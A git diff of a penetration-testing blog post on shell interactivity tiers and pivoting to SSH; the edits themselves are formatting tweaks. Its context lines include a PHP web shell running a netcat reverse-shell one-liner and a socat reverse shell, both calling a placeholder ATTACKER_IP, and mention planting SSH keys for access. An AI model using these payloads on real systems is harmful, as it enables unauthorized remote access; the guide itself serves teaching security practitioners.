@@ -6,14 +6,15 @@ description: A technical guide covering shell interactivity tiers in offensive s
 summary: This post breaks down every tier of shell quality, how to upgrade, and when it makes sense to just SSH in instead (along with the real trade-offs of doing so).
 tags:
 categories:
-  - technical-blog
+    - technical-blogs
 draft: false
 ---
+
 ## Overview
 
-When you first land a shell on a target, you rarely have what you need out-of-the-box. You may have a `php` web shell that is stateless without any interactive capability. Or you may have a raw `netcat` shell that breaks on `Ctrl + C`, can't run `vim, nano, sudo`, and has no tab completion. They may not be sufficient enough for you to continue your work. Therefore, understanding the spectrum of shell quality - from a simple web shell to a fully upgraded TTY - is an essential knowledge for anyone doing penetration testing or red teaming. 
+When you first land a shell on a target, you rarely have what you need out-of-the-box. You may have a `php` web shell that is stateless without any interactive capability. Or you may have a raw `netcat` shell that breaks on `Ctrl + C`, can't run `vim, nano, sudo`, and has no tab completion. They may not be sufficient enough for you to continue your work. Therefore, understanding the spectrum of shell quality - from a simple web shell to a fully upgraded TTY - is an essential knowledge for anyone doing penetration testing or red teaming.
 
-This post walks through every tier of shell interactivity, the payloads and upgrade techniques for each, and then tackles a question that often gets oversimplified: 
+This post walks through every tier of shell interactivity, the payloads and upgrade techniques for each, and then tackles a question that often gets oversimplified:
 
 > _When and why would you pivot to SSH instead of upgrading your shell in-place, and what are the real trade-offs?_
 
@@ -83,7 +84,7 @@ A fully upgraded TTY puts the local terminal into raw mode (`stty raw -echo`), w
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f"); ?>
 ```
 
-**Upgrade path:** Use the web shell to execute a reverse shell one-liner, transitioning to a *dumb shell*.
+**Upgrade path:** Use the web shell to execute a reverse shell one-liner, transitioning to a _dumb shell_.
 
 ---
 
@@ -93,7 +94,7 @@ A fully upgraded TTY puts the local terminal into raw mode (`stty raw -echo`), w
 
 **Use case:** First interactive foothold after initial access. Fast to deploy, minimal dependencies.
 
-**Limitations:** *Fragile* - `Ctrl+C` kills the session. No tab completion, no text editors, no job control. Traffic is plaintext over raw TCP (easily flagged by network monitoring).
+**Limitations:** _Fragile_ - `Ctrl+C` kills the session. No tab completion, no text editors, no job control. Traffic is plaintext over raw TCP (easily flagged by network monitoring).
 
 **Common payloads:**
 
@@ -136,7 +137,7 @@ $client.Close()
 
 **Use case:** Intermediate upgrade step. Necessary before attempting the full TTY upgrade. Also useful when you need `sudo` prompts or signal-safe commands but can't perform the full upgrade sequence.
 
-**Limitations:** Arrow keys and tab completion still don't work because the local terminal is still in `cooked` mode - it processes keystrokes before passing them to the remote PTY. Text editors are partially functional but *unreliable*.
+**Limitations:** Arrow keys and tab completion still don't work because the local terminal is still in `cooked` mode - it processes keystrokes before passing them to the remote PTY. Text editors are partially functional but _unreliable_.
 
 **Payloads to spawn a PTY:**
 
@@ -165,7 +166,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_POR
 
 ### Upgraded TTY
 
-**What it is:** A fully interactive terminal session achieved by combining a *PTY* on the target with *raw mode* on the attacker's local terminal.
+**What it is:** A fully interactive terminal session achieved by combining a _PTY_ on the target with _raw mode_ on the attacker's local terminal.
 
 **Use case:** Any situation requiring real interactivity: running `vim`, `sudo`, `top`, or any program that depends on terminal dimensions and key events. The standard target state for stable post-exploitation work.
 
@@ -198,7 +199,7 @@ stty rows 50 cols 220   # adjust to your terminal dimensions
 
 ### a. The Technique
 
-Once you have a *web shell* or *dumb shell* with write access to a user's home directory, you can plant your public key and establish a full SSH session - skipping the entire TTY upgrade process entirely.
+Once you have a _web shell_ or _dumb shell_ with write access to a user's home directory, you can plant your public key and establish a full SSH session - skipping the entire TTY upgrade process entirely.
 
 ```bash
 # From your dumb shell on target:
@@ -313,7 +314,7 @@ The underlying principle: **SSH is a tool, not a strategy**. In environments wit
 
 ---
 
-## 4. Putting It Together 
+## 4. Putting It Together
 
 The terminal goal in most engagements is not an upgraded TTY - it is a C2 implant with encrypted, resilient communications. Shells, TTY upgrades, and SSH sessions are all intermediate steps: ways to establish stability and maneuver until you can deploy something purpose-built.
 
